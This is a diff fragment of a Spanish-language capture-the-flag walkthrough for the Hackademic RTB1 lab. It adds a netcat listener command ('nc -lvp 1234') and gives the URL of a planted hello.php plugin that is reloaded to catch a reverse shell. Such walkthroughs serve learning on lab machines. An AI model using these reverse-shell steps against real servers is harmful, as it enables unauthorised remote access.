@@ -87,8 +87,12 @@ Pegan el código en hello.php y cambian la línea de `$ip` por su IP local, lueg
 
 ![10](https://user-images.githubusercontent.com/75953873/171926310-94b22d02-b809-4029-a72f-d90b1634fe8d.png)
 
-Abren una nueva terminal y ejecutan Netcat para que escuche las conexiones por el puerto 1234. Posteriormente recargan la siguiente URL:
+Abren una nueva terminal y ejecutan Netcat para que escuche las conexiones por el puerto 1234. 
+```
+nc -lvp 1234
+```
 
+Posteriormente recargan la siguiente URL:
 ```
 http://192.168.1.5/Hackademic_RTB1/wp-content/plugins/hello.php
 ```
